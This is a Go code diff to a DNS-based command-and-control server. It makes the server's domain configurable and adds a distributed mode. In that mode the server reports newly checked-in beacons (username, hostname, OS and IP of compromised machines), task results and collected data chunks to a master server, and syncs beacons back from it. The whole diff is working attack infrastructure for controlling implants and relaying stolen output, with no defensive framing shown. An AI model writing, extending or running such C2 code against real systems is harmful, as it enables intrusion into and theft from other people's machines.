@@ -93,12 +93,13 @@ type C2Manager struct {
 	debug           bool
 	aesKey          []byte
 	jitterConfig    StagerJitter // Stager timing configuration
+	domain          string       // The domain this server is authoritative for
 }
 
 // NewC2Manager creates a new C2 management instance with the specified configuration.
 // It initializes the beacon tracking system, task management, sets up AES encryption,
 // and initializes the database for persistent storage.
-func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, dbPath string) *C2Manager {
+func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, dbPath string, domain string) *C2Manager {
 	aesKey := generateAESKey(encryptionKey)
 
 	// Initialize database
@@ -121,6 +122,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		debug:           debug,
 		aesKey:          aesKey,
 		jitterConfig:    jitterConfig,
+		domain:          domain,
 	}
 
 	// Load existing beacons from database
@@ -609,18 +611,18 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	// NOTE: No mutex lock here - individual handler functions manage their own locks
 	// to prevent deadlock when handlers call other functions that also need locks
 
-	// Quick filter: only process queries to secwolf.net
-	if !strings.HasSuffix(qname, "secwolf.net") {
+	// Quick filter: only process queries to our configured domain
+	if !strings.HasSuffix(qname, c2.domain) {
 		return "", false
 	}
 
-	// Extract subdomain before "secwolf.net"
-	secwolfPos := strings.Index(qname, "secwolf.net")
-	if secwolfPos == -1 {
+	// Extract subdomain before our domain
+	domainPos := strings.Index(qname, c2.domain)
+	if domainPos == -1 {
 		return "", false
 	}
 
-	subdomain := strings.TrimRight(qname[:secwolfPos], ".")
+	subdomain := strings.TrimRight(qname[:domainPos], ".")
 	if len(subdomain) == 0 {
 		return "", false
 	}
@@ -844,6 +846,18 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 		c2.mutex.Unlock()
 		// Always log new beacon registration (even if duplicate DNS query)
 		logf("[C2] New beacon: %s (%s@%s) %s/%s from %s", beaconID, username, hostname, os, arch, clientIP)
+
+		// Report new beacon to Master Server (if in distributed mode)
+		if masterClient != nil {
+			go func() {
+				// Use goroutine to avoid blocking DNS response
+				if err := masterClient.ReportBeacon(beacon); err != nil {
+					if c2.debug {
+						logf("[C2] Failed to report beacon to master: %v", err)
+					}
+				}
+			}()
+		}
 	} else {
 		c2.mutex.Unlock()
 	}
@@ -856,6 +870,18 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 	beacon.Arch = arch
 	beacon.LastSeen = time.Now()
 	beacon.IPAddress = clientIP
+	c2.mutex.Unlock()
+
+	// Update beacon in master if it already existed (periodic check-in)
+	if exists && masterClient != nil {
+		go func() {
+			if err := masterClient.ReportBeacon(beacon); err != nil {
+				if c2.debug {
+					logf("[C2] Failed to update beacon on master: %v", err)
+				}
+			}
+		}()
+	}
 
 	// Create a copy for async DB save (to avoid race conditions)
 	beaconCopy := &Beacon{
@@ -867,7 +893,6 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 		LastSeen:  beacon.LastSeen,
 		IPAddress: beacon.IPAddress,
 	}
-	c2.mutex.Unlock()
 
 	// Save beacon to database (async to avoid blocking)
 	if c2.db != nil && !isDuplicate {
@@ -998,6 +1023,17 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 			}
 			if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
 				logf("[C2] Failed to update task status in database: %v", err)
+			}
+		}(taskID, beaconID, result)
+	}
+
+	// Report result to Master Server (if in distributed mode)
+	if masterClient != nil {
+		go func(tid, bid, res string) {
+			if err := masterClient.SubmitResult(tid, bid, 0, 1, res); err != nil {
+				if c2.debug {
+					logf("[C2] Failed to submit result to master: %v", err)
+				}
 			}
 		}(taskID, beaconID, result)
 	}
@@ -1196,8 +1232,36 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 				}
 			}(taskID, beaconID, result, expected.TotalChunks)
 		}
+
+		// Report complete result to Master Server (if in distributed mode)
+		// For multi-chunk results assembled locally, send the complete result
+		// Master will also reassemble from individual chunks, but this provides redundancy
+		if masterClient != nil && taskExists {
+			go func(tid, bid, res string, totalChunks int) {
+				// Send with chunk_index=0 and total_chunks set to actual count
+				// Master will recognize this as the complete assembled result
+				if err := masterClient.SubmitResult(tid, bid, 0, totalChunks, res); err != nil {
+					if c2.debug {
+						logf("[C2] Failed to submit assembled result to master: %v", err)
+					}
+				} else if c2.debug {
+					logf("[C2] Submitted assembled result to master: %d chunks, %d bytes", totalChunks, len(res))
+				}
+			}(taskID, beaconID, result, expected.TotalChunks)
+		}
 	} else {
 		c2.mutex.Unlock()
+
+		// Report chunk to Master Server (if in distributed mode) - for progress tracking
+		if masterClient != nil {
+			go func(tid, bid string, chunk int, total int, data string) {
+				if err := masterClient.SubmitResult(tid, bid, chunk, total, data); err != nil {
+					if c2.debug {
+						logf("[C2] Failed to submit chunk %d/%d to master: %v", chunk, total, err)
+					}
+				}
+			}(taskID, beaconID, chunkIndex, expected.TotalChunks, data)
+		}
 	}
 
 	return "ACK"
@@ -1450,6 +1514,48 @@ func (c2 *C2Manager) GetBeacons() map[string]*Beacon {
 		result[id] = beacon
 	}
 	return result
+}
+
+// SyncBeaconFromMaster adds or updates a beacon from master server
+// This allows DNS servers to be aware of beacons registered on other servers
+func (c2 *C2Manager) SyncBeaconFromMaster(beaconData BeaconData) {
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+
+	// Check if beacon already exists locally
+	beacon, exists := c2.beacons[beaconData.ID]
+
+	if !exists {
+		// Create new beacon from master data
+		beacon = &Beacon{
+			ID:        beaconData.ID,
+			Hostname:  beaconData.Hostname,
+			Username:  beaconData.Username,
+			OS:        beaconData.OS,
+			Arch:      beaconData.Arch,
+			IPAddress: beaconData.IPAddress,
+			LastSeen:  time.Now(), // Use current time for sync
+			TaskQueue: []Task{},
+		}
+		c2.beacons[beaconData.ID] = beacon
+
+		if c2.debug {
+			logf("[C2] Synced beacon from master: %s (%s@%s)", beaconData.ID, beaconData.Username, beaconData.Hostname)
+		}
+
+		// Save to local database
+		if c2.db != nil {
+			go func(b *Beacon) {
+				if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
+					logf("[C2] Failed to save synced beacon to database: %v", err)
+				}
+			}(beacon)
+		}
+	} else {
+		// Update existing beacon info (but don't override LastSeen from local check-ins)
+		beacon.IPAddress = beaconData.IPAddress
+		// Note: We don't update LastSeen here because local check-ins are more accurate
+	}
 }
 
 // GetTasks returns all tasks
